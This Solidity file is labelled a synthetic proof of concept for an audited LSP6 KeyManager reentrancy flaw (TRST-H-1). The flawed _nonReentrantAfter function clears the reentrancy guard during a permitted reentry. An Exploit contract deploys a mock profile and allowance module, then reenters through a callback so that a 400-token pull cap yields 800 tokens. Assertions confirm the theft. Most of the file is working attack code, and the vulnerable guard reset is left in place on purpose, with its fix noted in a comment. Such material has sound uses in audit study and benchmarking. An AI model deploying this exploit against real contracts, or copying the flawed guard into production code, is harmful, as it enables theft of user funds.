// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LUKSO LSP6 KeyManager — _nonReentrantAfter always clears the guard
    (Trust Security, 2023-04-13, finding 18974 / TRST-H-1). SYNTHETIC, cheatcode-free.
    _nonReentrantAfter is the audited function, copied verbatim (@> VULN).
    Root cause: a permitted reentry writes _reentrancyStatus = false on the way out,
    so the still-running outer execute no longer rejects a caller who lacks REENTRANCY.
    The profile's pull cap assumes that second execute is impossible. It is not:
    one 400 TOK pull becomes two, and 800 TOK leaves a 1,000 TOK profile. */

interface ILSP6Execute {
    function execute(bytes calldata payload) external payable returns (bytes memory);
}

interface IReentrant {
    function reenter() external;
    function didReenter() external view returns (bool);
}

contract Token {
    string public name = "ProfileToken";
    string public symbol = "TOK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Profile {
    Token public token;
    address public keyManager;
    address public module;
    bytes32 public lastReceiptTo;
    uint256 public lastReceiptAmount;
    mapping(address => bytes32) public permissions;

    constructor(address _token) {
        token = Token(_token);
    }

    function setKeyManager(address _keyManager) external {
        require(keyManager == address(0), "km set");
        keyManager = _keyManager;
    }

    function setModule(address _module) external {
        require(module == address(0), "module set");
        module = _module;
    }

    function setPermissions(address who, bytes32 bits) external {
        permissions[who] = bits;
    }

    function getPermissionsFor(address who) external view returns (bytes32) {
        return permissions[who];
    }

    function execute(uint256 operation, address to, uint256 value, bytes calldata data)
        external
        payable
        returns (bytes memory)
    {
        require(msg.sender == keyManager, "only km");
        require(operation == 0 && value == 0, "call");
        (bool ok, bytes memory ret) = to.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
        return ret;
    }

    function setReceipt(address to, uint256 amount) external {
        require(msg.sender == keyManager, "only km");
        lastReceiptTo = bytes32(uint256(uint160(to)));
        lastReceiptAmount = amount;
    }

    function pay(address to, uint256 amount) external {
        require(msg.sender == module, "only module");
        token.transfer(to, amount);
    }
}

contract AllowanceModule {
    uint256 public constant LIMIT = 400e18;

    Profile public profile;
    Integration public integration;
    mapping(address => uint256) public spent;

    constructor(address _profile, address _integration) {
        profile = Profile(_profile);
        integration = Integration(_integration);
    }

    /// Cap is checked before the callback. Updating `spent` afterwards is safe
    /// only while LSP6 rejects a second pull from inside `onPull`.
    function pull(address to, uint256 amount) external {
        require(msg.sender == address(profile), "only profile");
        uint256 nextSpent = spent[to] + amount;
        require(nextSpent <= LIMIT, "over cap");
        integration.onPull(to, amount);
        spent[to] += amount;
        profile.pay(to, amount);
    }
}

/// Third-party contract the profile granted REENTRANCY, so it can write a receipt
/// back through the KeyManager during a pull.
contract Integration {
    ILSP6Execute public km;
    IReentrant public attacker;
    Profile public profile;
    AllowanceModule public module;
    uint256 public reentryAttempts;
    uint256 public reentryBlocked;

    constructor(address _km, address _attacker, address _profile) {
        km = ILSP6Execute(_km);
        attacker = IReentrant(_attacker);
        profile = Profile(_profile);
    }

    function bind(address _module) external {
        require(address(module) == address(0), "bound");
        module = AllowanceModule(_module);
    }

    function onPull(address to, uint256 amount) external {
        require(msg.sender == address(module), "only module");
        bytes memory payload = abi.encodeWithSelector(Profile.setReceipt.selector, to, amount);
        km.execute(payload);
        if (reentryAttempts == 0) {
            reentryAttempts = 1;
            try attacker.reenter() {} catch {
                reentryBlocked = 1;
            }
        }
    }
}

contract LSP6KeyManager is ILSP6Execute {
    error NotAuthorised(address from, string permission);
    error InvalidPayload(bytes payload);

    bytes32 public constant _PERMISSION_REENTRANCY =
        0x0000000000000000000000000000000000000000000000000000000000000080;
    bytes32 public constant _PERMISSION_CALL =
        0x0000000000000000000000000000000000000000000000000000000000000800;

    address internal _target;
    address internal integration;
    address internal module;
    bool internal _reentrancyStatus;

    constructor(address target_) {
        _target = target_;
    }

    function bind(address _integration, address _module) external {
        require(integration == address(0) && module == address(0), "bound");
        integration = _integration;
        module = _module;
    }

    function target() public view returns (address) {
        return _target;
    }

    function execute(bytes calldata payload) external payable override returns (bytes memory) {
        return _execute(payload);
    }

    function _execute(bytes calldata payload) internal virtual returns (bytes memory) {
        _nonReentrantBefore(msg.sender);
        _verifyPermissions(msg.sender, payload);
        bytes memory result = _executePayload(payload);
        _nonReentrantAfter();
        return result;
    }

    function _executePayload(bytes calldata payload) internal returns (bytes memory) {
        (bool success, bytes memory returnData) = _target.call(payload);
        if (!success) {
            assembly {
                revert(add(returnData, 32), mload(returnData))
            }
        }
        return returnData;
    }

    function _verifyPermissions(address from, bytes calldata payload) internal view {
        bytes32 permissions = Profile(_target).getPermissionsFor(from);
        if (permissions == bytes32(0)) revert NotAuthorised(from, "CALL");
        if (payload.length < 4) revert InvalidPayload(payload);
        if (bytes4(payload) == Profile.setReceipt.selector) {
            _requirePermissions(from, permissions, _PERMISSION_REENTRANCY);
            return;
        }
        if (bytes4(payload) != Profile.execute.selector) revert InvalidPayload(payload);

        (uint256 operation, address to, uint256 value, bytes memory data) =
            abi.decode(payload[4:], (uint256, address, uint256, bytes));
        if (operation != 0 || value != 0 || data.length < 4) revert InvalidPayload(payload);

        bytes4 innerSel = bytes4(data);
        if (to == module && innerSel == AllowanceModule.pull.selector) {
            _requirePermissions(from, permissions, _PERMISSION_CALL);
            return;
        }
        revert NotAuthorised(from, "CALL");
    }

    function _requirePermissions(address from, bytes32 permissions, bytes32 required) internal pure {
        if ((permissions & required) != required) {
            revert NotAuthorised(from, required == _PERMISSION_REENTRANCY ? "REENTRANCY" : "CALL");
        }
    }

    /**
     * @dev Update the status from `_NON_ENTERED` to `_ENTERED` and checks if
     * the status is `_ENTERED` in order to revert the call unless the caller has the REENTRANCY permission
     * Used in the beginning of the `nonReentrant` modifier, before the method execution starts.
     */
    function _nonReentrantBefore(address from) internal virtual {
        if (_reentrancyStatus) {
            // CHECK the caller has REENTRANCY permission
            _requirePermissions(from, Profile(_target).getPermissionsFor(from), _PERMISSION_REENTRANCY);
        } else {
            _reentrancyStatus = true;
        }
    }

    /**
     * @dev Resets the status to `_NOT_ENTERED`
     * Used in the end of the `nonReentrant` modifier after the method execution is terminated
     */
    function _nonReentrantAfter() internal virtual {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        // @> VULN: always writes false, so a permitted reentry clears the guard while the outer execute is still running
        _reentrancyStatus = false;
        // FIX: write back the status from before this call. Do not force false.
    }
}

contract Exploit is IReentrant {
    uint256 public constant SUPPLY = 1000e18;

    Token public token; // nonce 1
    Profile public profile; // nonce 2
    LSP6KeyManager public km; // nonce 3
    Integration public integration; // nonce 4
    AllowanceModule public module; // nonce 5

    bool public didReenter;

    constructor() {
        token = new Token();
        profile = new Profile(address(token));
        km = new LSP6KeyManager(address(profile));
        integration = new Integration(address(km), address(this), address(profile));
        module = new AllowanceModule(address(profile), address(integration));
        integration.bind(address(module));
        km.bind(address(integration), address(module));
        profile.setKeyManager(address(km));
        profile.setModule(address(module));
        profile.setPermissions(address(this), km._PERMISSION_CALL());
        profile.setPermissions(address(integration), km._PERMISSION_REENTRANCY());
        token.mint(address(profile), SUPPLY);
    }

    function run() external {
        uint256 held = token.balanceOf(address(profile));
        require(held == SUPPLY, "not funded");

        uint256 used = module.spent(address(this));
        require(used == 0, "cap already used");

        bytes32 callerPerm = profile.getPermissionsFor(address(this));
        require(callerPerm == km._PERMISSION_CALL(), "caller perms");

        bytes32 hookPerm = profile.getPermissionsFor(address(integration));
        require(hookPerm == km._PERMISSION_REENTRANCY(), "hook perms");

        poke();

        uint256 stolen = token.balanceOf(address(this));
        require(stolen == 800e18, "double pull failed");
        require(token.balanceOf(address(profile)) == 200e18, "profile residue");
        require(module.spent(address(this)) == 800e18, "cap not exceeded");
        require(module.spent(address(this)) > module.LIMIT(), "still inside cap");
        require(didReenter, "reenter did not run");
        require(integration.reentryAttempts() == 1, "no reentry attempt");
        require(integration.reentryBlocked() == 0, "reentry was blocked");
    }

    function poke() public {
        km.execute(_pullPayload());
    }

    function reenter() external override {
        require(msg.sender == address(integration), "only integration");
        require(!didReenter, "already");
        didReenter = true;
        km.execute(_pullPayload());
    }

    function _pullPayload() internal view returns (bytes memory) {
        bytes memory inner = abi.encodeWithSelector(AllowanceModule.pull.selector, address(this), module.LIMIT());
        return abi.encodeWithSelector(
            Profile.execute.selector, uint256(0), address(module), uint256(0), inner
        );
    }
}
